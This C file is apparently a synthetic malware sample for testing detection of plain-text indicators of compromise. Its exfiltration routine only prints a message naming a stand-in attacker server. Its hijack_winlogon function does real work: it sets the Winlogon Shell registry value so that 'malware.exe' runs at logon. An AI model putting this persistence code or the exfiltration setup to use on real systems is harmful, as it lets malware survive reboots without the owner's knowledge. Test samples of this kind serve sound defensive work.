/*
 * sample_02_plain.c  –  SYNTHETIC MALWARE SAMPLE (safe, no real threat)
 * Obfuscation level : NONE  (plain-text IoCs)
 * Simulates        : Data exfiltration + Winlogon hijack
 */
#include <stdio.h>
#include <windows.h>

#define EXFIL_SERVER  "198.51.100.7"
#define EXFIL_DOMAIN  "exfil.attacker-lab.test"
#define EXFIL_PORT    8080

static const char *WINLOGON_KEY = "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell";

/* Send harvested data to exfiltration server */
void exfiltrate(const char *data, size_t len) {
    printf("[*] Sending %zu bytes to %s (%s:%d)\n",
           len, EXFIL_DOMAIN, EXFIL_SERVER, EXFIL_PORT);
}

/* Hijack Winlogon Shell for persistence */
void hijack_winlogon(void) {
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Shell", 0, REG_SZ,
        (BYTE *)"explorer.exe,malware.exe", 25);
    RegCloseKey(hKey);
}

int main(void) {
    hijack_winlogon();
    exfiltrate("sensitive_data", 14);
    return 0;
}
